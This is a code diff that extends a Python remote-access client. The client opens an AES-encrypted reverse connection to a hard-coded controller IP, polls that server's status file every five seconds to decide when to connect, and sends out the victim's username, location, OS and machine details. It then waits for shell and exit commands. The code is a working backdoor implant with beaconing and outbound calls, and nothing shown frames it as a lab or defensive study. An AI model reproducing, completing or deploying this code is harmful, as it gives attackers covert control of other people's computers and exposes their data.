@@ -1,14 +1,37 @@
 import socket
 import os
 import subprocess
-import getpass
+import json
 import time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad,unpad
 from Crypto.Random import get_random_bytes
-HOST = "192.168.30.52"
+import requests
+import platform
+import threading
+
+HOST = "192.168.140.65"
 PORT = 6565
 aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'
+running =False
+
+
+
+def check_status():
+    hostname = socket.gethostname()
+    url = "http://192.168.140.65/client_list.json"
+
+    try:
+        response = requests.get(url)
+        response_data = response.json()
+        client_ist = response_data.get("client_list",[])
+        for each in client_ist:
+            if each.get("HostName") == hostname:
+                return each.get("Status", "Unknown")
+        return "-1"
+    except :
+        return "0"  
+
 
 
 def encrypt_data(data):
@@ -33,11 +56,24 @@ def info(f,client):
 def first_connect(client):
     client.send(encrypt_data(socket.gethostname().encode('utf-8')))
     answer = decrypt_data(client.recv(1024)).decode("utf-8")
+    ipinfo = json.loads(requests.get("https://ipinfo.io").content.decode())
+
     if answer == "whoareyou":
-        client.send(encrypt_data(getpass.getuser().encode("utf-8")))
+        print("hello")
+        info = {
+        "city": ipinfo["city"],
+        "country" : ipinfo["country"],
+        "username" : os.getlogin(),
+        "system" : platform.uname().system,
+        "machine": platform.uname().machine,
+        "version": platform.uname().version,
+        }
+        info =json.dumps(info)
+        client.send(encrypt_data(info.encode("utf-8")))
 
 
-def connect():
+
+def connect(client):
     os_name = os.name
     while 1:
         pwd = os.getcwd()
@@ -118,16 +154,30 @@ def ftp(command,client):
 
 
 
+def start_party():
+    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    client.connect((HOST,PORT))
+    first_connect(client)
+    while 1:
+        command = decrypt_data(client.recv(40960)).decode("utf-8")
+        match command:
+                case "connect":
+                    connect(client)
+                case "exit":
+                    client.close()
+                    break
+            
 
-client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-client.connect((HOST,PORT))
-first_connect(client)
-while 1:
-    command = decrypt_data(client.recv(40960)).decode("utf-8")
-    match command:
-            case "connect":
-                connect()
-            case "exit":
-                client.close()
-                break
+while True:
+    # Timer = random.randit(20,200)
+    Timer = 5
+    time.sleep(Timer)
+    status = check_status()
+    print(status)
+    if (status == "True" and running == False) or status == "-1":
+        start_thread = threading.Thread(target=start_party)
+        start_thread.start()
+        running = True
+    elif status == "False" and running == True:
+        running = False
 
